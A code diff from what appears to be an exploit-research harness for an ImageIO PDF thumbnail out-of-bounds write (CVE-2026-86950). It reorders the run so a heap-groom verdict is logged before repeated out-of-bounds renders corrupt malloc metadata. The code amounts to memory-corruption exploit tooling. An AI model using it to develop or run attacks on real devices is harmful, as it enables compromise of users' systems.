@@ -339,15 +339,19 @@ static void ModRepeatCalibrated(void) {
 }
 
 NSString *ModCVE86950(void) {
-    // The raster-size sweep and the groom only repeat what we already know (the
-    // trigger kills the process on the first render), and they burn the whole
-    // run before the distance sweep is ever reached.  Order that gets an answer:
-    //   control -> distance sweep (R86950_START=<index> to jump to any distance).
+    // Order that gets an answer: bundle report -> control -> groom verdict ->
+    // repeat calibration -> leaf/chain/K/distance sweeps (R86950_START=<index>
+    // to jump to any distance).  The groom is first because its verdict is the
+    // run's purpose; a later freelist trap (secondary corruption) must not be
+    // able to kill the process before that line is flushed.
     AveLog(@"    CVE-2026-86950: ImageIO PDF thumbnail OOB (fixed only in 26.7.1)");
     AvePost(@"86950 start");
     ModReportBundle();
-    ModRepeatCalibrated();
-
+    // Groom verdict FIRST, before the 40-render repeat: the repeat's OOB writes
+    // are what corrupt malloc metadata, and the freelist check that later kills
+    // the process (observed on the CFNetwork CacheDB-write thread, 14/15 Nov)
+    // could fire before a late verdict line is flushed. The groom line is the
+    // run's purpose -- everything else is calibration.
     NSString *ctl = ModThumbPDF(@"control_86950.pdf", @"86950-CTL", 256);
     AvePost([NSString stringWithFormat:@"86950CTL %@", ctl]);
     if (![ctl containsString:@"OK"] && ![ctl containsString:@"NULL"]) {
@@ -373,6 +377,7 @@ NSString *ModCVE86950(void) {
         }
         AvePost(@"86950 groom: no changed words in the tagged regions this run");
     }
+    ModRepeatCalibrated();   // after the verdict, not before it
 
     ModSweepLeaf();
     ModSweepChain();
